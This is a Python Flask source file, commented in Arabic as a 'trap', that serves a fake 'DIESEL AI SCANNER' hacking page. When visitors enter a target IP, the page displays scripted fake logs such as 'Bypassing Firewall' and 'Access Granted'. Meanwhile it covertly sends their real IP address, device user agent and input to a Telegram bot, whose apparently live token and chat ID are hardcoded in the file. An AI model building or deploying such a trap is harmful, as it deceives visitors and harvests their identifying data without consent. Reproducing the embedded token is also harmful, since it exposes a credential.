import os
from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# بيانات البوت
TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU'
CHAT_ID = '5177962707'

# تصميم المصيدة مدمج داخل كود البايثون
HTML_CODE = """
<!DOCTYPE html>
<html>
<head>
    <title>DIESEL AI | SECURITY</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 2px solid #0f0; padding: 40px; box-shadow: 0 0 20px #0f0; text-align: center; width: 400px; background: #050505; }
        input { background: #111; border: 1px solid #0f0; color: #0f0; width: 90%; padding: 10px; margin-bottom: 20px; text-align: center; }
        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        #terminal { display: none; text-align: left; font-size: 14px; height: 250px; overflow-y: hidden; }
    </style>
</head>
<body>
    <div class="box" id="main-box">
        <h1>DIESEL AI SCANNER</h1>
        <input type="text" id="target" placeholder="Enter Target IP...">
        <br>
        <button onclick="startTrap()">EXECUTE SCAN</button>
    </div>
    <div id="terminal" class="box"></div>

    <script>
        function startTrap() {
            let target = document.getElementById('target').value;
            document.getElementById('main-box').style.display = 'none';
            document.getElementById('terminal').style.display = 'block';
            fetch('/trap', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: target}) });
            let logs = ["Initializing Diesel AI...", "Connecting...", "Scanning ports...", "Bypassing Firewall...", "Access Granted!", "Extracting..."];
            let i = 0;
            setInterval(() => { if(i < logs.length) document.getElementById('terminal').innerHTML += "> " + logs[i++] + "<br>"; }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_CODE)

@app.route('/trap', methods=['POST'])
def trap():
    data = request.json
    target = data.get('target', 'None')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    msg = f"🚨 **DIESEL AI HIT!**\n\n🎯 Target: {target}\n🌐 IP: {ip}\n📱 Device: {user_agent}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
    return {"status": "ok"}

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
